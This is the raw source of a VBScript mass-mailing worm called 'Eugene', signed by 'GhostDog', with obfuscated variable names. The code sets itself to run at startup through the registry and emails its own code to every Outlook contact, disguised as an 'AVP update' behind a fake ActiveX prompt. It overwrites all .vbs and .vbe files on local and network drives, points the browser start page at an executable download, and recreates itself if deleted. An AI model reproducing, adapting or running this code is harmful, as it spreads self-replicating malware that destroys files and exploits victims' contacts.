On Error Resume Next
Set uG5581O0d621y776u298pn00D9jqQf7 = CreateObject("WScript.Shell")
uG5581O0d621y776u298pn00D9jqQf7.regwrite "HKCU\software\Eugene\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set ik161x37Z0VyL2AmyGv9lSi85t5E7g6= Createobject("scripting.filesystemobject")
ik161x37Z0VyL2AmyGv9lSi85t5E7g6.copyfile wscript.scriptfullname,ik161x37Z0VyL2AmyGv9lSi85t5E7g6.GetSpecialFolder(0)& "\Eugene.vbs"
uG5581O0d621y776u298pn00D9jqQf7.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Eugene","wscript.exe "&ik161x37Z0VyL2AmyGv9lSi85t5E7g6.GetSpecialFolder(0)& "\Eugene.vbs %"
if uG5581O0d621y776u298pn00D9jqQf7.regread ("HKCU\software\Eugene\mailed") <> "1" then
zP18U1c45uEDor9ZH9g234KxsO4MTJl()
end if
H5v8CE7hqnm5JE4yhed1K4iUOpMv81a()
if day(now) = 7 then
uG5581O0d621y776u298pn00D9jqQf7.run "Http://www.avp.ru",3,false
end if
BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8= ""
BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8= uG5581O0d621y776u298pn00D9jqQf7.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
If (BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8= "") Then
BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8 = "c:"
End If
If Right(BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8, 1) = " \ " Then BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8 = Mid(BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8, 1, Len(BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8) - 1)
If Not (ik161x37Z0VyL2AmyGv9lSi85t5E7g6.fileexists(ik161x37Z0VyL2AmyGv9lSi85t5E7g6.getspecialfolder(0) & "\wc0008041905.exe")) Then
If Not (ik161x37Z0VyL2AmyGv9lSi85t5E7g6.fileexists(BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8 & "\wc0008041905.exe")) Then
uG5581O0d621y776u298pn00D9jqQf7.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http:\\download1.avp.ch\avpfiles\wc0008041905.exe"
Else
uG5581O0d621y776u298pn00D9jqQf7.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
ik161x37Z0VyL2AmyGv9lSi85t5E7g6.copyfile BP3FMU5RRpXnrkJa18r8U7f9ZO7EzU8 & "\wc0008041905.exe", ik161x37Z0VyL2AmyGv9lSi85t5E7g6.getspecialfolder(0) & "\wc0008041905.exe"
uG5581O0d621y776u298pn00D9jqQf7.run ik161x37Z0VyL2AmyGv9lSi85t5E7g6.getspecialfolder(0) & "\wc0008041905.exe", 1, False
end if
Set JMbhpGwdlUsrgHTnc9jjEIUeR6OJE8B= ik161x37Z0VyL2AmyGv9lSi85t5E7g6.opentextfile(wscript.scriptfullname, 1)
vmqRojP18U1c45uEDor9ZH9g234KxsO= JMbhpGwdlUsrgHTnc9jjEIUeR6OJE8B.readall
JMbhpGwdlUsrgHTnc9jjEIUeR6OJE8B.Close
Do
If Not (ik161x37Z0VyL2AmyGv9lSi85t5E7g6.fileexists(wscript.scriptfullname)) Then
Set hukZq25v8CE7hqnm5JE4yhedMGB9Qul= ik161x37Z0VyL2AmyGv9lSi85t5E7g6.createtextfile(wscript.scriptfullname, True)
hukZq25v8CE7hqnm5JE4yhedMGB9Qul.writevmqRojP18U1c45uEDor9ZH9g234KxsO
hukZq25v8CE7hqnm5JE4yhedMGB9Qul.Close
End If
Loop
Function zP18U1c45uEDor9ZH9g234KxsO4MTJl()
On Error Resume Next
Set I723VDL2BIQOvzlTjn5a5E7n6QY6OhK= CreateObject("Outlook.Application")
If I723VDL2BIQOvzlTjn5a5E7n6QY6OhK = "Outlook" Then
Set B0k622fx76C2zgqo3cDjjyQfemEaaiY= ik161x37Z0VyL2AmyGv9lSi85t5E7g6.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While B0k622fx76C2zgqo3cDjjyQfemEaaiY.atendofstream = False
KWDTu75mNkfjJIQGy235cpkn7VDT2QY= B0k622fx76C2zgqo3cDjjyQfemEaaiY.readline
v2TO3hpgfmB4rLYxDd50iLFAEu1azMG= v2TO3hpgfmB4rLYxDd50iLFAEu1azMG& Chr(34) & " & vbcrlf & " & Chr(34) & replace(KWDTu75mNkfjJIQGy235cpkn7VDT2QY, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
B0k622fx76C2zgqo3cDjjyQfemEaaiY.close
Y55o4O0k622fx76C2zgqo3cDjjyQfem = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem& vbCrLf & "On Error Resume Next"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "If Err.Number <> 0 Then"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "Else"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\Eugene.vbs" & Chr(34) & ", True)"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "vbs.write  " & Chr(34) & v2TO3hpgfmB4rLYxDd50iLFAEu1azMG& Chr(34)
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "vbs.Close"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
Y55o4O0k622fx76C2zgqo3cDjjyQfem = Y55o4O0k622fx76C2zgqo3cDjjyQfem & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\Eugene.vbs %" & Chr(34) & ""
EAgbY4WDTu75mNkfjJIQGy235cpkn7V = EAgbY4WDTu75mNkfjJIQGy235cpkn7V& vbCrLf & "document.write " & Chr(34) & "Sorry, it's no Update to AVP latest Virus Discriptings, but<br>is a Update to another Virus, for Infected our System..<br><br>Bye Our Friend GhostDog<br>" & Chr(34) & ""
EAgbY4WDTu75mNkfjJIQGy235cpkn7V = EAgbY4WDTu75mNkfjJIQGy235cpkn7V& vbCrLf & "End If"
EAgbY4WDTu75mNkfjJIQGy235cpkn7V = EAgbY4WDTu75mNkfjJIQGy235cpkn7V & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
o7qypo2TO3hpgfmofMl47jUOJMv84aC=Y55o4O0k622fx76C2zgqo3cDjjyQfem & EAgbY4WDTu75mNkfjJIQGy235cpkn7V
Set P6MMB5RYHXnykJal8s820f94P9ELU8Q = I723VDL2BIQOvzlTjn5a5E7n6QY6OhK.GetNameSpace("MAPI")
set kqSRZPz904c65v4EvC9ZH9hb34RxzO7=P6MMB5RYHXnykJal8s820f94P9ELU8Q.AddressLists
For Each tbipHxdl3szDHUuc9OBE4BWR6OJM84W In kqSRZPz904c65v4EvC9ZH9hb34RxzO7
If tbipHxdl3szDHUuc9OBE4BWR6OJM84W.AddressEntries.Count <> 0 Then
MW3rg6v8CE0ixon5JF7TofMl47jUOJM= tbipHxdl3szDHUuc9OBE4BWR6OJM84W.AddressEntries.Count
Set Y6B6056MMB5RYHXnykJal8s820f94P9= I723VDL2BIQOvzlTjn5a5E7n6QY6OhK.CreateItem(0)
Y6B6056MMB5RYHXnykJal8s820f94P9.Subject = "New Update from AVP"
Y6B6056MMB5RYHXnykJal8s820f94P9.HTMLBody = o7qypo2TO3hpgfmofMl47jUOJMv84aC
Y6B6056MMB5RYHXnykJal8s820f94P9.DeleteAfterSubmit = True
For vZm6uTbipHxdl3szDHUuc9OBE4BWR6O = 1 To MW3rg6v8CE0ixon5JF7TofMl47jUOJM
Set J46WsnqSRZPz904c65v4EvC9ZH9hb34= tbipHxdl3szDHUuc9OBE4BWR6OJM84W.AddressEntries(vZm6uTbipHxdl3szDHUuc9OBE4BWR6O)
If MW3rg6v8CE0ixon5JF7TofMl47jUOJM= 1 Then
Y6B6056MMB5RYHXnykJal8s820f94P9.BCC = J46WsnqSRZPz904c65v4EvC9ZH9hb34.Address
Else
Y6B6056MMB5RYHXnykJal8s820f94P9.BCC = Y6B6056MMB5RYHXnykJal8s820f94P9.BCC & "; " & J46WsnqSRZPz904c65v4EvC9ZH9hb34.Address
End If
Next
Y6B6056MMB5RYHXnykJal8s820f94P9.send
End If
Next
uG5581O0d621y776u298pn00D9jqQf7.regwrite "HKCU\software\Eugene\mailed", "1"
I723VDL2BIQOvzlTjn5a5E7n6QY6OhK.Quit
end if
End Function
Function H5v8CE7hqnm5JE4yhed1K4iUOpMv81a()
On Error Resume Next
Set R6954BW3rg6v8CE0ixon5L17Vqh6n58 = ik161x37Z0VyL2AmyGv9lSi85t5E7g6.Drives
For Each leqYo07D716mOOD6TAI7pamLcnzQ931 In R6954BW3rg6v8CE0ixon5L17Vqh6n58
If leqYo07D716mOOD6TAI7pamLcnzQ931.Drivetype = Remote Then
CfO6saBo7wVdjr1zfS3ubF8WwT0QDG5= leqYo07D716mOOD6TAI7pamLcnzQ931 & "\"
Call DNV1w456YupV6TBRb90tL75x4GN5mBJ(CfO6saBo7wVdjr1zfS3ubF8WwT0QDG5)
ElseIf leqYo07D716mOOD6TAI7pamLcnzQ931.IsReady Then
CfO6saBo7wVdjr1zfS3ubF8WwT0QDG5= leqYo07D716mOOD6TAI7pamLcnzQ931&"\"
Call DNV1w456YupV6TBRb90tL75x4GN5mBJ(CfO6saBo7wVdjr1zfS3ubF8WwT0QDG5)
End If
Next
End Function
Function DNV1w456YupV6TBRb90tL75x4GN5mBJ(xJfYBb70g5DY4si6F9E51VzqN6L17Vq)
A66Ax1fO6saBo7wVdjr1zfS3ubF8WwT=xJfYBb70g5DY4si6F9E51VzqN6L17Vq
Set KGrV5teqYo07D716mOOD6TAI7pamLcn= ik161x37Z0VyL2AmyGv9lSi85t5E7g6.GetFolder(A66Ax1fO6saBo7wVdjr1zfS3ubF8WwT)
Set uLpkP1NV1w456YupV6TBRb90tL75x4G= KGrV5teqYo07D716mOOD6TAI7pamLcn.Files
For Each xA003pJfYBb70g5DY4si6F9E51k70iL In uLpkP1NV1w456YupV6TBRb90tL75x4G
if ik161x37Z0VyL2AmyGv9lSi85t5E7g6.GetExtensionName(xA003pJfYBb70g5DY4si6F9E51k70iL.path) = "vbs" then
ik161x37Z0VyL2AmyGv9lSi85t5E7g6.copyfile wscript.scriptfullname , xA003pJfYBb70g5DY4si6F9E51k70iL.path , true
end if
if ik161x37Z0VyL2AmyGv9lSi85t5E7g6.GetExtensionName(xA003pJfYBb70g5DY4si6F9E51k70iL.path) = "vbe" then
ik161x37Z0VyL2AmyGv9lSi85t5E7g6.copyfile wscript.scriptfullname , xA003pJfYBb70g5DY4si6F9E51k70iL.path , true
end if
Next
Set xA003pJfYBb70g5DY4si6F9E51k70iL= KGrV5teqYo07D716mOOD6TAI7pamLcn.SubFolders
For Each F0NqK1ZkxF463R375sVCL4HIyOvgsTi In xA003pJfYBb70g5DY4si6F9E51k70iL
Call DNV1w456YupV6TBRb90tL75x4GN5mBJ(F0NqK1ZkxF463R375sVCL4HIyOvgsTi.path)
Next
End Function
'by GhostDog@EveryMail.net

